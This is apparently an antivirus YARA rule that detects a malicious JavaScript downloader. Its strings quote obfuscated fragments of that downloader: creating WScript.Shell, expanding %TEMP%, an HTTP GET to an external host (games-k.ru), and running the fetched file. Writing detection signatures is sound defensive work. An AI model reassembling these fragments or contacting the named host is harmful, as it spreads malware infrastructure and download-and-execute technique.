rule sig_20160427_122040adbdfd75c01892e68217ba4d2b {
  meta:
    description = "datamaliciousorder - file 20160427_122040adbdfd75c01892e68217ba4d2b.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "6de896bbf2e400c0149081d03029cc682aab2189cf976590dc6635d2d2065408"

  strings:
    $s1  = "function AtygwOqrok() {return FpsrmTqnxc[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"+\"MP%/\") + \"xnxqore" ascii
    $s2  = "function AtygwOqrok() {return FpsrmTqnxc[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"+\"MP%/\") + \"xnxqore" ascii
    $s3  = "function SljasUjoza(DfrukGuola, FcboeChtuk){TaclaQkjog = TaclaQkjog * 1; return DfrukGuola - FcboeChtuk;};" fullword ascii
    $s4  = "var FpsrmTqnxc = function IqvjcZqjte() {return PwscfVpfuj[WtsuqLwcoo](\"WScript\"+\".Shell\");}(), EqvgkPjixp = 11;" fullword ascii
    $s5  = "RpjsfUmagg[WtydiYpafe](\"G\" + \"ET\", \"http://games-k.ru/n8eis\", false);" fullword ascii
    $s6  = "var PwscfVpfuj = this[\"WScript\"];" fullword ascii
    $s7  = "function SvgshZeeai(){return YmjfxKzcjt + \"\";};" fullword ascii
    $s8  = "if (RpjsfUmagg[\"r\"+\"eadystate\"] < 2 * 2) continue;" fullword ascii
    $s9  = "function VximgQarju() {return ((XlojkPtcyd == true) && (XlojkPtcyd == VchwnWhbed)) ? 1 : TaclaQkjog;};" fullword ascii
    $s10 = "var XlojkPtcyd = false;" fullword ascii
    $s11 = "return SljasUjoza(SnqndFiorx, OxszlZinok);" fullword ascii
    $s12 = "function MkdwsDmqjm(){return 23;};" fullword ascii
    $s13 = "function TvenfVmndf(){return WtsuqLwcoo;};" fullword ascii
    $s14 = "BqqemRmxyl = true;" fullword ascii
    $s15 = "}while (RrwthNbnms);" fullword ascii
    $s16 = "var RjcupQvwlr = new this[\"D\"+\"ate\"]();" fullword ascii
    $s17 = "VchwnWhbed = true; " fullword ascii
    $s18 = "var BqqemRmxyl = false;" fullword ascii
    $s19 = "function WxibmMnbgl(KqlotZagao) {var GorvuBnhwb = (1, 2, 3, 4, 5, KqlotZagao); return GorvuBnhwb;};" fullword ascii
    $s20 = "function ZyexxJpigs(PahcpSlnzm){FpsrmTqnxc[\"R\"+\"un\"](PahcpSlnzm, TaclaQkjog, TaclaQkjog);};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}